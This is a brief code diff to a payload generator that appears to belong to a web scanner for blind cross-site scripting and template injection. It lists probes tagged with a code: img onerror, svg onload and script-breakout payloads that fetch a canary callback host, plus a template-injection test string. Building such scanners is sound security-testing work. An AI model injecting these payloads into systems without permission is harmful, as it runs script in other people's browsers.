@@ -37,7 +37,8 @@ def payload(code, limit):
     """As many of the probes as fit the field, each tagged with the code."""
     parts = [
         f"X{code}",
-        f"<img src=//canary.invalid/{code}m onerror=fetch('//canary.invalid/{code}j')>",
+        f"<img src=//canary.invalid/{code}m>",  # short, so 50-character fields get a probe too
+        f"<img src=x onerror=fetch('//canary.invalid/{code}j')>",
         f"\"><svg onload=fetch('//canary.invalid/{code}a')>",
         f"</script><script>fetch('//canary.invalid/{code}s')</script>",
         "{{7*7}}${7*7}",
